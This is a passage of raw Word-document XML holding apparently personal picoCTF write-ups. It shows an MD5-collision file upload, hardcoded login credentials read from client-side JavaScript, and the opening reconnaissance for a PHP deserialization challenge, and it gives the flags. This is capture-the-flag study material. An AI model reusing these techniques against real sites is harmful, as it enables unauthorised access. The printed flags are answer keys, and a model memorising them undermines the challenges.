            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:11590/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6860B3F6" w14:textId="431122FF" w:rsidR="00BE3C0E" w:rsidRDefault="00BE3C0E" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>d5 hash collision</w:t>
      </w:r>
      <w:r w:rsidR="00E16DA0">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE3C0E">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>A collision is when you find two files to have the same hash.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D68A2B7" w14:textId="5C592430" w:rsidR="00BE3C0E" w:rsidRDefault="00BE3C0E" w:rsidP="00BE3C0E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">oogle </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>d5 hash collision example</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B100CE1" w14:textId="5FACAD07" w:rsidR="00BE3C0E" w:rsidRDefault="00BE3C0E" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">I found on </w:t>
      </w:r>
      <w:hyperlink r:id="rId114" w:history="1">
        <w:r w:rsidRPr="00BE3C0E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          </w:rPr>
          <w:t>this</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> website, there are two files with same md5 hash sum </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52CF7B6D" w14:textId="6BE3918A" w:rsidR="00BE3C0E" w:rsidRDefault="00000000" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId115" w:history="1">
        <w:r w:rsidR="00BE3C0E" w:rsidRPr="00BE3C0E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          </w:rPr>
          <w:t>https://www.mathstat.dal.ca/~selinger/md5collision/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="14535BA3" w14:textId="5CEF4378" w:rsidR="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77E1B91B" w14:textId="41F5A7C2" w:rsidR="00BE3C0E" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2ED02FF3" wp14:editId="04EAE23B">
            <wp:extent cx="6332220" cy="2270125"/>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16"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2270125"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="08318B68" w14:textId="6FBDC4A8" w:rsidR="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E2E63DB" w14:textId="364A65A7" w:rsidR="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>download and rename these 2 files</w:t>
      </w:r>
      <w:r w:rsidRPr="00E16DA0">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B2D312"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0E9DD791" w14:textId="25C1C637" w:rsidR="00E16DA0" w:rsidRPr="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="00E16DA0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E16DA0">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">└─$ mv erase erase.pdf                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58639870"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5F2A8B36" w14:textId="7FDBD474" w:rsidR="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="00E16DA0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E16DA0">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>└─$ mv hello hello.pdf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="483461C6" w14:textId="12FBDAEB" w:rsidR="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>upload these 2 files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="630A356C" w14:textId="6E158A76" w:rsidR="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>we get the index.php file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6DB738" w14:textId="4D96FC62" w:rsidR="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="345D25DA" wp14:editId="67C9EEBD">
            <wp:extent cx="4975860" cy="4048681"/>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17"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4979276" cy="4051460"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7056AC" w14:textId="52B9EFA2" w:rsidR="007C33FA" w:rsidRDefault="007C33FA" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="422AE9F3" w14:textId="4B8A8870" w:rsidR="007C33FA" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E16DA0">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>FLAG: picoCTF{c0ngr4ts_u_r_1nv1t3d_3d3e4c57}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA0FC25" w14:textId="66F5C78B" w:rsidR="00B6083C" w:rsidRDefault="00B6083C" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D24F9F9" w14:textId="77777777" w:rsidR="00B6083C" w:rsidRDefault="00B6083C" w:rsidP="00B6083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Local Authority</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E969914"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27B6305"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Exploitationinspector</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2292669F" w14:textId="77777777" w:rsidR="00B6083C" w:rsidRDefault="00B6083C" w:rsidP="00B6083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577B741" w14:textId="77777777" w:rsidR="00B6083C" w:rsidRDefault="00B6083C" w:rsidP="00B6083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Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBE1C1E" w14:textId="77777777" w:rsidR="00B6083C" w:rsidRDefault="00B6083C" w:rsidP="00B6083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get the flag?Go to this </w:t>
      </w:r>
      <w:hyperlink r:id="rId118"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7DF510DC" w14:textId="292AF390" w:rsidR="00B6083C" w:rsidRDefault="00734CC9" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Hint:</w:t>
      </w:r>
      <w:r w:rsidRPr="00734CC9">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How is the password checked on this website?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCEA078" w14:textId="429CC8C0" w:rsidR="00734CC9" w:rsidRDefault="00734CC9" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0D745A10" wp14:editId="43AFD75A">
            <wp:extent cx="6309907" cy="388653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19"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6309907" cy="3886537"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="13CE4C50" w14:textId="6CE87519" w:rsidR="00734CC9" w:rsidRDefault="00734CC9"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Click on login.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE11E7E" w14:textId="09A88B40" w:rsidR="00CE3B46" w:rsidRDefault="00CE3B46" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2D5618D1" wp14:editId="5B02E62A">
            <wp:extent cx="4755292" cy="2240474"/>
            <wp:effectExtent l="0" t="0" r="762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20"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4755292" cy="2240474"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F2CA07" w14:textId="4BE71F85"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Secure.js looks interesting </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB110EC" w14:textId="1C101473" w:rsidR="00CE3B46" w:rsidRDefault="00CE3B46" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE3B46">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="538B8566" wp14:editId="2A897638">
            <wp:extent cx="4138019" cy="1402202"/>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121"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4138019" cy="1402202"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="33D74AEF" w14:textId="65628A30" w:rsidR="00CE3B46"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t>username === 'admin' &amp;&amp; password === 'strongPassword098765'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="105C4BB3" w14:textId="2E15723D"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input this credential we got the flag:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4603A064" w14:textId="0CA33B6E" w:rsidR="00734CC9"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t>picoCTF{j5_15_7r4n5p4r3n7_05df90c8}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2B8FAC" w14:textId="3B33B9D6" w:rsidR="00A35726" w:rsidRDefault="00A35726" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59C61216" w14:textId="47D720CB" w:rsidR="00A35726" w:rsidRPr="00EA3443" w:rsidRDefault="00A35726" w:rsidP="00A35726">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA3443">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF0000"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Super Serial</w:t>
      </w:r>
      <w:r w:rsidR="00EA3443">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve"> HARD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB0BF0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 | 130 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9DD5C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2B1FD3EB" w14:textId="77777777" w:rsidR="00A35726" w:rsidRDefault="00A35726" w:rsidP="00A3572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F11ABEB" w14:textId="77777777" w:rsidR="00A35726" w:rsidRDefault="00A35726" w:rsidP="00A3572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3FD567F" w14:textId="736532C9" w:rsidR="00A35726" w:rsidRDefault="00A35726" w:rsidP="00A3572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to recover the flag stored on this website </w:t>
      </w:r>
      <w:hyperlink r:id="rId122" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:5428/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0C5A47CD" w14:textId="16CDDC49" w:rsidR="00F924A8" w:rsidRDefault="00F924A8" w:rsidP="00A35726">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="888888"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Hint 1 : The flag is at ../flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6D266D" w14:textId="2CFC8AB3" w:rsidR="00A35726" w:rsidRPr="00A35726" w:rsidRDefault="005C5F86" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005C5F86">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222A42"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Serialization</w:t>
      </w:r>
      <w:r w:rsidRPr="005C5F86">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the process of turning some object into a data format that can be restored later.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="693DB803" w14:textId="77777777" w:rsidR="005C5F86" w:rsidRPr="005C5F8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People often serialize objects in order to save them to storage, or to send as part of communications.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FC948D1" w14:textId="77777777" w:rsidR="005C5F86" w:rsidRPr="005C5F86" w:rsidRDefault="005C5F86" w:rsidP="005C5F86">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28306656" w14:textId="67FB722F" w:rsidR="00A3572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 xml:space="preserve">Deserialization is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is </w:t>
      </w:r>
      <w:r w:rsidRPr="005C5F86">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>JSON. Before that, it was XML.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE6A732" w14:textId="77777777" w:rsidR="005C5F86" w:rsidRDefault="005C5F86" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70F7FAB6" w14:textId="77777777" w:rsidR="00A35726" w:rsidRP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If you use .php as your extension to a file, the server will then interpret the code behind that script and returns the desired output.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="745A0EF3" w14:textId="1BA9A068" w:rsid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While .phps will just output literally a color-formatted content of that script as shown below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C72E5A0" w14:textId="77777777" w:rsidR="00F924A8" w:rsidRDefault="00F924A8" w:rsidP="00F924A8">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C859AA">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:color w:val="222222"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>再看</w:t>
      </w:r>
      <w:r w:rsidRPr="00C859AA">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C859AA">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="OpenSymbol" w:hAnsi="Consolas"/>
          <w:color w:val="222222"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>robots.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EDFE2A6" w14:textId="77777777" w:rsidR="00F924A8" w:rsidRDefault="00000000" w:rsidP="00F924A8">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId123" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="00F924A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="FC4D50"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:25395/robots.txt</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5E06C4A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User-agent: *</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B25BE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 xml:space="preserve">Disallow: </w:t>
      </w:r>
      <w:r w:rsidRPr="00C859AA">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="OpenSymbol" w:hAnsi="Consolas"/>
          <w:color w:val="C5C8C6"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>/admin.phps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="097BCF90"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lastRenderedPageBreak/>
        <w:t>當然要試試</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="OpenSymbol" w:hAnsi="Consolas"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>admin.php</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="OpenSymbol" w:hAnsi="Consolas"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>admin.phps</w:t>
      </w:r>
      <w:r>
        <w:rPr>
